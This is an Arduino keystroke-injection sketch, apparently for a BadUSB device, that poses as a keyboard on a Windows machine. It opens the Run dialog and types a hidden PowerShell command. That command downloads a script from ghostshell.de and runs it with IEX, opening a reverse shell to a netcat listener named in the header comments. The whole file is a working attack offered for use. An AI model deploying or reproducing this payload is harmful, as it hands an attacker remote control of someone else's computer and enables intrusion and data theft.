
// Ghostshell
// www.ghostshell.de
// Windows Reverse-Shell TCP PS
// Tested on Windows 7
// Listener: nc -lnvp 6666

#include "Keyboard.h"
 
void setup() {

}

void loop() {
Keyboard.begin();
delay(3000);
Keyboard.press(KEY_LEFT_GUI);
delay(1000);
Keyboard.press('r');
Keyboard.releaseAll();
delay(300);
Keyboard.println("powershell.exe -windowstyle hidden \"IEX ((new-object net.webclient).downloadstring('http://ghostshell.de/payloads/gen_payload.php?ip=wslab.de&port=6666&os=windows_reverseshell_tcp_ps'))\"");
delay(500);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(60000);
}
